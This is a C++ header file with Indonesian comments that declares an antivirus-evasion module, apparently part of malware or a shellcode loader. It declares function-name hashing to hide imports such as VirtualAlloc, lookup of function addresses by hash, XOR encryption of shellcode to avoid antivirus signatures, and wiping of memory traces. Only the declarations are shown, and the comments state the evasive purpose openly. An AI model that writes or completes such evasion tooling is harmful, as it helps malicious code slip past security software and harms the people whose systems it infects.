#ifndef EVASION_HPP
#define EVASION_HPP

#include <windows.h>
#include <string>
#include <vector>
#include <iostream>

namespace DefenseEvasion {
    // Menggunakan hashing untuk menyembunyikan nama fungsi dari IAT
    // Contoh: Daripada mencari "VirtualAlloc", kita mencari hash 0xABC123
    uint32_t calculate_hash(const std::string& functionName);
    
    // Mencari address fungsi di memory berdasarkan hash
    FARPROC get_proc_address_by_hash(HMODULE module, uint32_t hash);

    // XOR Encryption untuk shellcode agar tidak terdeteksi signature AV
    std::vector<uint8_t> xor_encrypt_decrypt(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key);

    // Menghapus jejak di memory (Zeroing out)
    void secure_wipe(void* ptr, size_t size);
}

#endif